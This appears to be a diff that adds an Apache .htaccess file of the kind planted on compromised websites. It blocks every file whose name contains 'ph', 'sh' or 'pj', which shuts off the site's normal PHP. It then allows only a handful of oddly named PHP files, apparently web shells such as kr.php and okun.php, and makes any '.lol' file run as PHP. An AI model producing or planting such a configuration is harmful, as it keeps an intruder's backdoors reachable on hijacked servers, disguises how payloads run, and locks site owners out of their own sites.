@@ -1,0 +1,23 @@
+Options -Indexes
+<FilesMatch "(?i).*(ph|sh|pj).*">
+    Order Deny,Allow
+    Deny from all
+</FilesMatch>
+<Files kr.php>
+Allow from all
+</Files>
+<Files Lyt.zip.gz.txt.php>
+Allow from all
+</Files>
+<Files Lyt.tar.gz.php>
+Allow from all
+</Files>
+<Files class-mate.php>
+Allow from all
+</Files>
+<Files okun.php>
+Allow from all
+</Files>
+<FilesMatch \.(lol)$>
+     SetHandler application/x-httpd-php
+</FilesMatch>
